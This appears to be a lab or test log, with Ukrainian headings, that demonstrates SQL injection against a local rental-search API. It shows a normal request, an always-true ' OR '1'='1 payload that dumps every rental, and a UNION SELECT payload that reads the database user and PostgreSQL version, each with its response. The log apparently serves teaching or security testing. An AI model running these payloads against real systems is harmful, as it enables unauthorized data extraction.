==================== 1. SQL Injection: GET /rentals/search ====================
--- 1.1 Звичайний пошук: має знайти тільки одну оренду
REQUEST:  GET http://127.0.0.1:8082/rentals/search?reference=RENT-A-1795029808
RESPONSE: HTTP 200
[{"id":1,"reference":"RENT-A-1795029808","total":92000,"status":"Active"}]

--- 1.2 Payload ' OR '1'='1 : умова завжди true
REQUEST:  GET http://127.0.0.1:8082/rentals/search?reference=' OR '1'='1
RESPONSE: HTTP 200
[{"id":1,"reference":"RENT-A-1795029808","total":92000,"status":"Active"},{"id":2,"reference":"RENT-B-1795029808","total":79200,"status":"Active"}]

--- 1.3 Payload UNION: читаємо дані, яких API не віддає (користувач БД і версія)
REQUEST:  GET http://127.0.0.1:8082/rentals/search?reference=' UNION SELECT 0, current_user, 0, version() --
RESPONSE: HTTP 200
[{"id":0,"reference":"rental_student","total":0,"status":"PostgreSQL 17.11 on aarch64-unknown-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit"}]
